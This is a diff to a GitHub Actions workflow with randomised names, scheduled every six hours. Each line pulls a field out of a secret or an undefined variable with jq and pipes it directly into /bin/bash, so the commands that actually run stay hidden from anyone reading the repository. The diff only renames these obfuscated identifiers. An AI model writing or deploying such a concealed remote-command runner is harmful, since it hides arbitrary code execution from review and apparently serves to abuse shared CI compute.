@@ -1,24 +1,29 @@
 name: tulongzhe2345
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 3/6 * * *'
-jobs:  # 26219
+    - cron: '0 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tulongzhe2345
         env:
-          xs24426: ${{ secrets.xs24426 }}
+          iraf6: ${{ secrets.iraf6 }}
         run: |
-          echo $xs24426 | jq -r .zxnll987 | /bin/bash
-          echo $vbssy598 | jq -r .xn2994 | /bin/bash
-          echo $jsbla7 | jq -r .oda9 | /bin/bash
-          echo $vqusw77 | jq -r .irmb9 | /bin/bash
-          echo $et977 | jq -r .ttzk695 | /bin/bash
-          echo $rpm4 | jq -r .wj811 | /bin/bash
-          echo $ij5305 | jq -r .t6 | /bin/bash
+          echo $iraf6 | jq -r .vdt1 | /bin/bash
+          echo $h7403 | jq -r .pgbb620 | /bin/bash
+          echo $htyek2 | jq -r .x64 | /bin/bash
+          echo $dexdz43 | jq -r .ghayk48041 | /bin/bash
+          echo $ayke1 | jq -r .slvn7 | /bin/bash
+          echo $mkty5464 | jq -r .nc7043 | /bin/bash
+          echo $t5 | jq -r .f575 | /bin/bash
+          echo $eja416 | jq -r .img17466 | /bin/bash
+          echo $tj7 | jq -r .vhu902 | /bin/bash
+          echo $t63032 | jq -r .jr3710 | /bin/bash
+          echo $y405 | jq -r .o41341 | /bin/bash
+          echo $z55 | jq -r .cmff01038 | /bin/bash
+          echo $r71030 | jq -r .q8486 | /bin/bash
 
